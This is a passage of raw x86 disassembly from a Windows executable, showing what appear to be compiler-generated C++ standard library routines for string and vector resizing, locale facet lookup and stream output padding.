  4077a2:	72 04                	jb     0x4077a8
  4077a4:	8b 07                	mov    (%edi),%eax
  4077a6:	eb 02                	jmp    0x4077aa
  4077a8:	8b c7                	mov    %edi,%eax
  4077aa:	53                   	push   %ebx
  4077ab:	50                   	push   %eax
  4077ac:	8b 45 0c             	mov    0xc(%ebp),%eax
  4077af:	50                   	push   %eax
  4077b0:	e8 7d 13 00 00       	call   0x408b32
  4077b5:	83 c4 0c             	add    $0xc,%esp
  4077b8:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  4077bc:	72 0c                	jb     0x4077ca
  4077be:	8b 0f                	mov    (%edi),%ecx
  4077c0:	51                   	push   %ecx
  4077c1:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4077c7:	83 c4 04             	add    $0x4,%esp
  4077ca:	8b 45 0c             	mov    0xc(%ebp),%eax
  4077cd:	c6 07 00             	movb   $0x0,(%edi)
  4077d0:	89 07                	mov    %eax,(%edi)
  4077d2:	89 77 14             	mov    %esi,0x14(%edi)
  4077d5:	89 5f 10             	mov    %ebx,0x10(%edi)
  4077d8:	83 fe 10             	cmp    $0x10,%esi
  4077db:	72 02                	jb     0x4077df
  4077dd:	8b f8                	mov    %eax,%edi
  4077df:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
  4077e3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4077e6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4077ed:	59                   	pop    %ecx
  4077ee:	5f                   	pop    %edi
  4077ef:	5e                   	pop    %esi
  4077f0:	5b                   	pop    %ebx
  4077f1:	8b e5                	mov    %ebp,%esp
  4077f3:	5d                   	pop    %ebp
  4077f4:	c2 0c 00             	ret    $0xc
  4077f7:	8b 75 08             	mov    0x8(%ebp),%esi
  4077fa:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4077fe:	72 0c                	jb     0x40780c
  407800:	8b 16                	mov    (%esi),%edx
  407802:	52                   	push   %edx
  407803:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407809:	83 c4 04             	add    $0x4,%esp
  40780c:	6a 00                	push   $0x0
  40780e:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  407815:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40781c:	6a 00                	push   $0x0
  40781e:	c6 06 00             	movb   $0x0,(%esi)
  407821:	e8 46 13 00 00       	call   0x408b6c
  407826:	cc                   	int3
  407827:	cc                   	int3
  407828:	cc                   	int3
  407829:	cc                   	int3
  40782a:	cc                   	int3
  40782b:	cc                   	int3
  40782c:	cc                   	int3
  40782d:	cc                   	int3
  40782e:	cc                   	int3
  40782f:	cc                   	int3
  407830:	55                   	push   %ebp
  407831:	8b ec                	mov    %esp,%ebp
  407833:	6a ff                	push   $0xffffffff
  407835:	68 40 8d 40 00       	push   $0x408d40
  40783a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407840:	50                   	push   %eax
  407841:	83 ec 14             	sub    $0x14,%esp
  407844:	53                   	push   %ebx
  407845:	56                   	push   %esi
  407846:	57                   	push   %edi
  407847:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40784c:	33 c5                	xor    %ebp,%eax
  40784e:	50                   	push   %eax
  40784f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407852:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407858:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40785b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40785e:	8b 7d 08             	mov    0x8(%ebp),%edi
  407861:	8b f0                	mov    %eax,%esi
  407863:	83 ce 07             	or     $0x7,%esi
  407866:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  40786c:	76 04                	jbe    0x407872
  40786e:	8b f0                	mov    %eax,%esi
  407870:	eb 27                	jmp    0x407899
  407872:	8b 5f 14             	mov    0x14(%edi),%ebx
  407875:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  40787a:	f7 e6                	mul    %esi
  40787c:	8b cb                	mov    %ebx,%ecx
  40787e:	d1 e9                	shr    $1,%ecx
  407880:	d1 ea                	shr    $1,%edx
  407882:	3b ca                	cmp    %edx,%ecx
  407884:	76 13                	jbe    0x407899
  407886:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  40788b:	2b c1                	sub    %ecx,%eax
  40788d:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  407890:	3b d8                	cmp    %eax,%ebx
  407892:	76 05                	jbe    0x407899
  407894:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  407899:	33 c0                	xor    %eax,%eax
  40789b:	8d 4e 01             	lea    0x1(%esi),%ecx
  40789e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4078a1:	3b c8                	cmp    %eax,%ecx
  4078a3:	76 18                	jbe    0x4078bd
  4078a5:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4078ab:	77 14                	ja     0x4078c1
  4078ad:	03 c9                	add    %ecx,%ecx
  4078af:	51                   	push   %ecx
  4078b0:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4078b6:	83 c4 04             	add    $0x4,%esp
  4078b9:	85 c0                	test   %eax,%eax
  4078bb:	74 04                	je     0x4078c1
  4078bd:	8b d8                	mov    %eax,%ebx
  4078bf:	eb 50                	jmp    0x407911
  4078c1:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4078c4:	52                   	push   %edx
  4078c5:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4078c8:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4078cf:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  4078d5:	68 58 b0 40 00       	push   $0x40b058
  4078da:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4078dd:	50                   	push   %eax
  4078de:	c7 45 e0 e4 a8 40 00 	movl   $0x40a8e4,-0x20(%ebp)
  4078e5:	e8 82 12 00 00       	call   0x408b6c
  4078ea:	8b 45 0c             	mov    0xc(%ebp),%eax
  4078ed:	8d 48 01             	lea    0x1(%eax),%ecx
  4078f0:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4078f3:	89 45 0c             	mov    %eax,0xc(%ebp)
  4078f6:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4078fa:	e8 81 f2 ff ff       	call   0x406b80
  4078ff:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407902:	b8 08 79 40 00       	mov    $0x407908,%eax
  407907:	c3                   	ret
  407908:	8b 7d 08             	mov    0x8(%ebp),%edi
  40790b:	8b 75 0c             	mov    0xc(%ebp),%esi
  40790e:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  407911:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407914:	85 c9                	test   %ecx,%ecx
  407916:	74 1c                	je     0x407934
  407918:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  40791c:	72 04                	jb     0x407922
  40791e:	8b 07                	mov    (%edi),%eax
  407920:	eb 02                	jmp    0x407924
  407922:	8b c7                	mov    %edi,%eax
  407924:	03 c9                	add    %ecx,%ecx
  407926:	51                   	push   %ecx
  407927:	50                   	push   %eax
  407928:	53                   	push   %ebx
  407929:	e8 04 12 00 00       	call   0x408b32
  40792e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407931:	83 c4 0c             	add    $0xc,%esp
  407934:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  407938:	72 0f                	jb     0x407949
  40793a:	8b 17                	mov    (%edi),%edx
  40793c:	52                   	push   %edx
  40793d:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407943:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407946:	83 c4 04             	add    $0x4,%esp
  407949:	89 1f                	mov    %ebx,(%edi)
  40794b:	89 77 14             	mov    %esi,0x14(%edi)
  40794e:	89 4f 10             	mov    %ecx,0x10(%edi)
  407951:	83 fe 08             	cmp    $0x8,%esi
  407954:	72 02                	jb     0x407958
  407956:	8b fb                	mov    %ebx,%edi
  407958:	33 d2                	xor    %edx,%edx
  40795a:	66 89 14 4f          	mov    %dx,(%edi,%ecx,2)
  40795e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407961:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407968:	59                   	pop    %ecx
  407969:	5f                   	pop    %edi
  40796a:	5e                   	pop    %esi
  40796b:	5b                   	pop    %ebx
  40796c:	8b e5                	mov    %ebp,%esp
  40796e:	5d                   	pop    %ebp
  40796f:	c2 0c 00             	ret    $0xc
  407972:	8b 75 08             	mov    0x8(%ebp),%esi
  407975:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  407979:	72 0c                	jb     0x407987
  40797b:	8b 06                	mov    (%esi),%eax
  40797d:	50                   	push   %eax
  40797e:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407984:	83 c4 04             	add    $0x4,%esp
  407987:	33 c9                	xor    %ecx,%ecx
  407989:	51                   	push   %ecx
  40798a:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  407991:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  407998:	51                   	push   %ecx
  407999:	66 89 0e             	mov    %cx,(%esi)
  40799c:	e8 cb 11 00 00       	call   0x408b6c
  4079a1:	cc                   	int3
  4079a2:	cc                   	int3
  4079a3:	cc                   	int3
  4079a4:	cc                   	int3
  4079a5:	cc                   	int3
  4079a6:	cc                   	int3
  4079a7:	cc                   	int3
  4079a8:	cc                   	int3
  4079a9:	cc                   	int3
  4079aa:	cc                   	int3
  4079ab:	cc                   	int3
  4079ac:	cc                   	int3
  4079ad:	cc                   	int3
  4079ae:	cc                   	int3
  4079af:	cc                   	int3
  4079b0:	55                   	push   %ebp
  4079b1:	8b ec                	mov    %esp,%ebp
  4079b3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4079b6:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4079bc:	76 0b                	jbe    0x4079c9
  4079be:	68 c0 a8 40 00       	push   $0x40a8c0
  4079c3:	ff 15 38 a1 40 00    	call   *0x40a138
  4079c9:	8b 46 08             	mov    0x8(%esi),%eax
  4079cc:	2b 06                	sub    (%esi),%eax
  4079ce:	d1 f8                	sar    $1,%eax
  4079d0:	3b c1                	cmp    %ecx,%eax
  4079d2:	73 4a                	jae    0x407a1e
  4079d4:	53                   	push   %ebx
  4079d5:	57                   	push   %edi
  4079d6:	e8 a5 f1 ff ff       	call   0x406b80
  4079db:	8b 4e 04             	mov    0x4(%esi),%ecx
  4079de:	8b d8                	mov    %eax,%ebx
  4079e0:	8b 06                	mov    (%esi),%eax
  4079e2:	2b c8                	sub    %eax,%ecx
  4079e4:	d1 f9                	sar    $1,%ecx
  4079e6:	03 c9                	add    %ecx,%ecx
  4079e8:	51                   	push   %ecx
  4079e9:	50                   	push   %eax
  4079ea:	53                   	push   %ebx
  4079eb:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4079f1:	8b 06                	mov    (%esi),%eax
  4079f3:	8b 7e 04             	mov    0x4(%esi),%edi
  4079f6:	2b f8                	sub    %eax,%edi
  4079f8:	83 c4 0c             	add    $0xc,%esp
  4079fb:	d1 ff                	sar    $1,%edi
  4079fd:	85 c0                	test   %eax,%eax
  4079ff:	74 0a                	je     0x407a0b
  407a01:	50                   	push   %eax
  407a02:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407a08:	83 c4 04             	add    $0x4,%esp
  407a0b:	8b 55 08             	mov    0x8(%ebp),%edx
  407a0e:	8d 0c 7b             	lea    (%ebx,%edi,2),%ecx
  407a11:	8d 04 53             	lea    (%ebx,%edx,2),%eax
  407a14:	5f                   	pop    %edi
  407a15:	89 1e                	mov    %ebx,(%esi)
  407a17:	89 46 08             	mov    %eax,0x8(%esi)
  407a1a:	89 4e 04             	mov    %ecx,0x4(%esi)
  407a1d:	5b                   	pop    %ebx
  407a1e:	5d                   	pop    %ebp
  407a1f:	c2 04 00             	ret    $0x4
  407a22:	cc                   	int3
  407a23:	cc                   	int3
  407a24:	cc                   	int3
  407a25:	cc                   	int3
  407a26:	cc                   	int3
  407a27:	cc                   	int3
  407a28:	cc                   	int3
  407a29:	cc                   	int3
  407a2a:	cc                   	int3
  407a2b:	cc                   	int3
  407a2c:	cc                   	int3
  407a2d:	cc                   	int3
  407a2e:	cc                   	int3
  407a2f:	cc                   	int3
  407a30:	55                   	push   %ebp
  407a31:	8b ec                	mov    %esp,%ebp
  407a33:	83 ec 10             	sub    $0x10,%esp
  407a36:	33 c0                	xor    %eax,%eax
  407a38:	85 c9                	test   %ecx,%ecx
  407a3a:	74 4c                	je     0x407a88
  407a3c:	81 f9 49 92 24 09    	cmp    $0x9249249,%ecx
  407a42:	77 1b                	ja     0x407a5f
  407a44:	8d 04 cd 00 00 00 00 	lea    0x0(,%ecx,8),%eax
  407a4b:	2b c1                	sub    %ecx,%eax
  407a4d:	03 c0                	add    %eax,%eax
  407a4f:	03 c0                	add    %eax,%eax
  407a51:	50                   	push   %eax
  407a52:	ff 15 ec a1 40 00    	call   *0x40a1ec
  407a58:	83 c4 04             	add    $0x4,%esp
  407a5b:	85 c0                	test   %eax,%eax
  407a5d:	75 29                	jne    0x407a88
  407a5f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407a62:	51                   	push   %ecx
  407a63:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407a66:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  407a6d:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  407a73:	68 58 b0 40 00       	push   $0x40b058
  407a78:	8d 55 f0             	lea    -0x10(%ebp),%edx
  407a7b:	52                   	push   %edx
  407a7c:	c7 45 f0 e4 a8 40 00 	movl   $0x40a8e4,-0x10(%ebp)
  407a83:	e8 e4 10 00 00       	call   0x408b6c
  407a88:	8b e5                	mov    %ebp,%esp
  407a8a:	5d                   	pop    %ebp
  407a8b:	c3                   	ret
  407a8c:	cc                   	int3
  407a8d:	cc                   	int3
  407a8e:	cc                   	int3
  407a8f:	cc                   	int3
  407a90:	55                   	push   %ebp
  407a91:	8b ec                	mov    %esp,%ebp
  407a93:	8b 45 08             	mov    0x8(%ebp),%eax
  407a96:	83 ec 0c             	sub    $0xc,%esp
  407a99:	83 f8 ff             	cmp    $0xffffffff,%eax
  407a9c:	76 0b                	jbe    0x407aa9
  407a9e:	68 c0 a8 40 00       	push   $0x40a8c0
  407aa3:	ff 15 38 a1 40 00    	call   *0x40a138
  407aa9:	8b 4e 08             	mov    0x8(%esi),%ecx
  407aac:	2b 0e                	sub    (%esi),%ecx
  407aae:	3b c8                	cmp    %eax,%ecx
  407ab0:	73 53                	jae    0x407b05
  407ab2:	53                   	push   %ebx
  407ab3:	57                   	push   %edi
  407ab4:	33 ff                	xor    %edi,%edi
  407ab6:	85 c0                	test   %eax,%eax
  407ab8:	74 10                	je     0x407aca
  407aba:	50                   	push   %eax
  407abb:	ff 15 ec a1 40 00    	call   *0x40a1ec
  407ac1:	8b f8                	mov    %eax,%edi
  407ac3:	83 c4 04             	add    $0x4,%esp
  407ac6:	85 ff                	test   %edi,%edi
  407ac8:	74 41                	je     0x407b0b
  407aca:	8b 06                	mov    (%esi),%eax
  407acc:	8b 56 04             	mov    0x4(%esi),%edx
  407acf:	2b d0                	sub    %eax,%edx
  407ad1:	52                   	push   %edx
  407ad2:	50                   	push   %eax
  407ad3:	57                   	push   %edi
  407ad4:	ff 15 fc a1 40 00    	call   *0x40a1fc
  407ada:	8b 06                	mov    (%esi),%eax
  407adc:	8b 5e 04             	mov    0x4(%esi),%ebx
  407adf:	83 c4 0c             	add    $0xc,%esp
  407ae2:	2b d8                	sub    %eax,%ebx
  407ae4:	85 c0                	test   %eax,%eax
  407ae6:	74 0a                	je     0x407af2
  407ae8:	50                   	push   %eax
  407ae9:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407aef:	83 c4 04             	add    $0x4,%esp
  407af2:	8b 45 08             	mov    0x8(%ebp),%eax
  407af5:	8d 14 1f             	lea    (%edi,%ebx,1),%edx
  407af8:	8d 0c 07             	lea    (%edi,%eax,1),%ecx
  407afb:	89 3e                	mov    %edi,(%esi)
  407afd:	5f                   	pop    %edi
  407afe:	89 4e 08             	mov    %ecx,0x8(%esi)
  407b01:	89 56 04             	mov    %edx,0x4(%esi)
  407b04:	5b                   	pop    %ebx
  407b05:	8b e5                	mov    %ebp,%esp
  407b07:	5d                   	pop    %ebp
  407b08:	c2 04 00             	ret    $0x4
  407b0b:	8d 45 08             	lea    0x8(%ebp),%eax
  407b0e:	50                   	push   %eax
  407b0f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  407b12:	c7 45 08 00 00 00 00 	movl   $0x0,0x8(%ebp)
  407b19:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  407b1f:	68 58 b0 40 00       	push   $0x40b058
  407b24:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  407b27:	51                   	push   %ecx
  407b28:	c7 45 f4 e4 a8 40 00 	movl   $0x40a8e4,-0xc(%ebp)
  407b2f:	e8 38 10 00 00       	call   0x408b6c
  407b34:	cc                   	int3
  407b35:	cc                   	int3
  407b36:	cc                   	int3
  407b37:	cc                   	int3
  407b38:	cc                   	int3
  407b39:	cc                   	int3
  407b3a:	cc                   	int3
  407b3b:	cc                   	int3
  407b3c:	cc                   	int3
  407b3d:	cc                   	int3
  407b3e:	cc                   	int3
  407b3f:	cc                   	int3
  407b40:	55                   	push   %ebp
  407b41:	8b ec                	mov    %esp,%ebp
  407b43:	6a ff                	push   $0xffffffff
  407b45:	68 e9 8b 40 00       	push   $0x408be9
  407b4a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407b50:	50                   	push   %eax
  407b51:	83 ec 14             	sub    $0x14,%esp
  407b54:	56                   	push   %esi
  407b55:	57                   	push   %edi
  407b56:	a1 18 e0 40 00       	mov    0x40e018,%eax
  407b5b:	33 c5                	xor    %ebp,%eax
  407b5d:	50                   	push   %eax
  407b5e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407b61:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407b67:	8b f9                	mov    %ecx,%edi
  407b69:	6a 00                	push   $0x0
  407b6b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407b6e:	ff 15 24 a1 40 00    	call   *0x40a124
  407b74:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  407b7b:	a1 88 22 41 00       	mov    0x412288,%eax
  407b80:	8b 0d 3c a1 40 00    	mov    0x40a13c,%ecx
  407b86:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407b89:	ff 15 8c a0 40 00    	call   *0x40a08c
  407b8f:	8b f0                	mov    %eax,%esi
  407b91:	8b 07                	mov    (%edi),%eax
  407b93:	3b 70 0c             	cmp    0xc(%eax),%esi
  407b96:	73 23                	jae    0x407bbb
  407b98:	8b 48 08             	mov    0x8(%eax),%ecx
  407b9b:	8b 0c b1             	mov    (%ecx,%esi,4),%ecx
  407b9e:	85 c9                	test   %ecx,%ecx
  407ba0:	75 1d                	jne    0x407bbf
  407ba2:	80 78 14 00          	cmpb   $0x0,0x14(%eax)
  407ba6:	74 17                	je     0x407bbf
  407ba8:	ff 15 2c a1 40 00    	call   *0x40a12c
  407bae:	3b 70 0c             	cmp    0xc(%eax),%esi
  407bb1:	73 12                	jae    0x407bc5
  407bb3:	8b 50 08             	mov    0x8(%eax),%edx
  407bb6:	8b 34 b2             	mov    (%edx,%esi,4),%esi
  407bb9:	eb 06                	jmp    0x407bc1
  407bbb:	33 c9                	xor    %ecx,%ecx
  407bbd:	eb e3                	jmp    0x407ba2
  407bbf:	8b f1                	mov    %ecx,%esi
  407bc1:	85 f6                	test   %esi,%esi
  407bc3:	75 52                	jne    0x407c17
  407bc5:	8b 75 f0             	mov    -0x10(%ebp),%esi
  407bc8:	85 f6                	test   %esi,%esi
  407bca:	75 4b                	jne    0x407c17
  407bcc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407bcf:	57                   	push   %edi
  407bd0:	50                   	push   %eax
  407bd1:	ff 15 9c a0 40 00    	call   *0x40a09c
  407bd7:	83 c4 08             	add    $0x8,%esp
  407bda:	83 f8 ff             	cmp    $0xffffffff,%eax
  407bdd:	75 1c                	jne    0x407bfb
  407bdf:	68 d4 a8 40 00       	push   $0x40a8d4
  407be4:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407be7:	ff 15 48 a2 40 00    	call   *0x40a248
  407bed:	68 20 b0 40 00       	push   $0x40b020
  407bf2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  407bf5:	51                   	push   %ecx
  407bf6:	e8 71 0f 00 00       	call   0x408b6c
  407bfb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407bfe:	8b f1                	mov    %ecx,%esi
  407c00:	89 0d 88 22 41 00    	mov    %ecx,0x412288
  407c06:	8b f9                	mov    %ecx,%edi
  407c08:	ff 15 94 a0 40 00    	call   *0x40a094
  407c0e:	57                   	push   %edi
  407c0f:	e8 bc 04 00 00       	call   0x4080d0
  407c14:	83 c4 04             	add    $0x4,%esp
  407c17:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407c1a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  407c21:	ff 15 28 a1 40 00    	call   *0x40a128
  407c27:	8b c6                	mov    %esi,%eax
  407c29:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407c2c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407c33:	59                   	pop    %ecx
  407c34:	5f                   	pop    %edi
  407c35:	5e                   	pop    %esi
  407c36:	8b e5                	mov    %ebp,%esp
  407c38:	5d                   	pop    %ebp
  407c39:	c3                   	ret
  407c3a:	cc                   	int3
  407c3b:	cc                   	int3
  407c3c:	cc                   	int3
  407c3d:	cc                   	int3
  407c3e:	cc                   	int3
  407c3f:	cc                   	int3
  407c40:	55                   	push   %ebp
  407c41:	8b ec                	mov    %esp,%ebp
  407c43:	6a ff                	push   $0xffffffff
  407c45:	68 22 8d 40 00       	push   $0x408d22
  407c4a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407c50:	50                   	push   %eax
  407c51:	83 ec 2c             	sub    $0x2c,%esp
  407c54:	53                   	push   %ebx
  407c55:	56                   	push   %esi
  407c56:	57                   	push   %edi
  407c57:	a1 18 e0 40 00       	mov    0x40e018,%eax
  407c5c:	33 c5                	xor    %ebp,%eax
  407c5e:	50                   	push   %eax
  407c5f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407c62:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407c68:	89 65 f0             	mov    %esp,-0x10(%ebp)
  407c6b:	8b 75 08             	mov    0x8(%ebp),%esi
  407c6e:	8b 45 0c             	mov    0xc(%ebp),%eax
  407c71:	33 ff                	xor    %edi,%edi
  407c73:	89 7d ec             	mov    %edi,-0x14(%ebp)
  407c76:	8d 48 01             	lea    0x1(%eax),%ecx
  407c79:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  407c80:	8a 10                	mov    (%eax),%dl
  407c82:	40                   	inc    %eax
  407c83:	84 d2                	test   %dl,%dl
  407c85:	75 f9                	jne    0x407c80
  407c87:	2b c1                	sub    %ecx,%eax
  407c89:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407c8c:	8b 06                	mov    (%esi),%eax
  407c8e:	8b 50 04             	mov    0x4(%eax),%edx
  407c91:	8b 4c 32 24          	mov    0x24(%edx,%esi,1),%ecx
  407c95:	8b 44 32 20          	mov    0x20(%edx,%esi,1),%eax
  407c99:	89 7d dc             	mov    %edi,-0x24(%ebp)
  407c9c:	3b cf                	cmp    %edi,%ecx
  407c9e:	7c 20                	jl     0x407cc0
  407ca0:	7f 0f                	jg     0x407cb1
  407ca2:	3b c7                	cmp    %edi,%eax
  407ca4:	76 1a                	jbe    0x407cc0
  407ca6:	3b cf                	cmp    %edi,%ecx
  407ca8:	7c 16                	jl     0x407cc0
  407caa:	7f 05                	jg     0x407cb1
  407cac:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  407caf:	76 0f                	jbe    0x407cc0
  407cb1:	2b 45 d8             	sub    -0x28(%ebp),%eax
  407cb4:	1b cf                	sbb    %edi,%ecx
  407cb6:	8b f8                	mov    %eax,%edi
  407cb8:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407cbb:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  407cbe:	eb 0a                	jmp    0x407cca
  407cc0:	33 c0                	xor    %eax,%eax
  407cc2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  407cc5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407cc8:	8b f8                	mov    %eax,%edi
  407cca:	8b 54 32 38          	mov    0x38(%edx,%esi,1),%edx
  407cce:	8b de                	mov    %esi,%ebx
  407cd0:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  407cd3:	85 d2                	test   %edx,%edx
  407cd5:	74 09                	je     0x407ce0
  407cd7:	8b 02                	mov    (%edx),%eax
  407cd9:	8b ca                	mov    %edx,%ecx
  407cdb:	8b 50 04             	mov    0x4(%eax),%edx
  407cde:	ff d2                	call   *%edx
  407ce0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  407ce7:	8b 06                	mov    (%esi),%eax
  407ce9:	8b 40 04             	mov    0x4(%eax),%eax
  407cec:	83 7c 30 0c 00       	cmpl   $0x0,0xc(%eax,%esi,1)
  407cf1:	75 10                	jne    0x407d03
  407cf3:	8b 44 30 3c          	mov    0x3c(%eax,%esi,1),%eax
  407cf7:	85 c0                	test   %eax,%eax
  407cf9:	74 08                	je     0x407d03
  407cfb:	8b c8                	mov    %eax,%ecx
  407cfd:	ff 15 60 a1 40 00    	call   *0x40a160
  407d03:	8b 06                	mov    (%esi),%eax
  407d05:	8b 50 04             	mov    0x4(%eax),%edx
  407d08:	83 7c 32 0c 00       	cmpl   $0x0,0xc(%edx,%esi,1)
  407d0d:	0f 94 c1             	sete   %cl
  407d10:	88 4d cc             	mov    %cl,-0x34(%ebp)
  407d13:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407d1a:	84 c9                	test   %cl,%cl
  407d1c:	75 0c                	jne    0x407d2a
  407d1e:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  407d25:	e9 75 01 00 00       	jmp    0x407e9f
  407d2a:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407d2d:	51                   	push   %ecx
  407d2e:	b3 02                	mov    $0x2,%bl
  407d30:	8d 0c 16             	lea    (%esi,%edx,1),%ecx
  407d33:	88 5d fc             	mov    %bl,-0x4(%ebp)
  407d36:	ff 15 a0 a0 40 00    	call   *0x40a0a0
  407d3c:	8b c8                	mov    %eax,%ecx
  407d3e:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  407d42:	e8 f9 fd ff ff       	call   0x407b40
  407d47:	88 5d fc             	mov    %bl,-0x4(%ebp)
  407d4a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407d4d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407d50:	85 c9                	test   %ecx,%ecx
  407d52:	74 14                	je     0x407d68
  407d54:	ff 15 90 a0 40 00    	call   *0x40a090
  407d5a:	85 c0                	test   %eax,%eax
  407d5c:	74 0a                	je     0x407d68
  407d5e:	8b 10                	mov    (%eax),%edx
  407d60:	8b c8                	mov    %eax,%ecx
  407d62:	8b 02                	mov    (%edx),%eax
  407d64:	6a 01                	push   $0x1
  407d66:	ff d0                	call   *%eax
  407d68:	8b 0e                	mov    (%esi),%ecx
  407d6a:	8b 51 04             	mov    0x4(%ecx),%edx
  407d6d:	8b 44 32 14          	mov    0x14(%edx,%esi,1),%eax
  407d71:	25 c0 01 00 00       	and    $0x1c0,%eax
  407d76:	83 f8 40             	cmp    $0x40,%eax
  407d79:	74 48                	je     0x407dc3
  407d7b:	eb 03                	jmp    0x407d80
  407d7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  407d80:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  407d83:	85 db                	test   %ebx,%ebx
  407d85:	7c 3f                	jl     0x407dc6
  407d87:	7f 04                	jg     0x407d8d
  407d89:	85 ff                	test   %edi,%edi
  407d8b:	74 39                	je     0x407dc6
  407d8d:	8b 06                	mov    (%esi),%eax
  407d8f:	8b 40 04             	mov    0x4(%eax),%eax
  407d92:	0f b7 54 30 40       	movzwl 0x40(%eax,%esi,1),%edx
  407d97:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  407d9b:	52                   	push   %edx
  407d9c:	ff 15 5c a1 40 00    	call   *0x40a15c
  407da2:	0f b7 c0             	movzwl %ax,%eax
  407da5:	ba ff ff 00 00       	mov    $0xffff,%edx
  407daa:	66 3b d0             	cmp    %ax,%dx
  407dad:	75 06                	jne    0x407db5
  407daf:	83 4d ec 04          	orl    $0x4,-0x14(%ebp)
  407db3:	eb 11                	jmp    0x407dc6
  407db5:	83 c7 ff             	add    $0xffffffff,%edi
  407db8:	83 d3 ff             	adc    $0xffffffff,%ebx
  407dbb:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407dbe:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407dc1:	eb bd                	jmp    0x407d80
  407dc3:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  407dc6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  407dca:	0f 85 88 00 00 00    	jne    0x407e58
  407dd0:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
